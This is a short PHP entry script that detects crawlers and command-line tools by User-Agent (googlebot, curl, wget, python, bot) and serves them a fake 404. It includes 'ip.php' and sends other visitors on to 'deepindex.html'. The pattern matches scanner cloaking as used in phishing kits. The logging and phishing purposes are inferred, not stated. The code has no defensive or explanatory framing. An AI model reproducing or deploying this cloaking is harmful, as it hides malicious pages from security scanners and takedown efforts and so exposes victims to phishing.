<?php
if (isset($_SERVER['HTTP_USER_AGENT'])) {
    $ua = $_SERVER['HTTP_USER_AGENT'];
    if (stripos($ua, 'googlebot') !== false || 
        stripos($ua, 'curl') !== false || 
        stripos($ua, 'wget') !== false || 
        stripos($ua, 'python') !== false || 
        stripos($ua, 'bot') !== false) {
        header("HTTP/1.0 404 Not Found");
        exit;
    }
}

include 'ip.php';
header('Location: deepindex.html');
exit;
?>
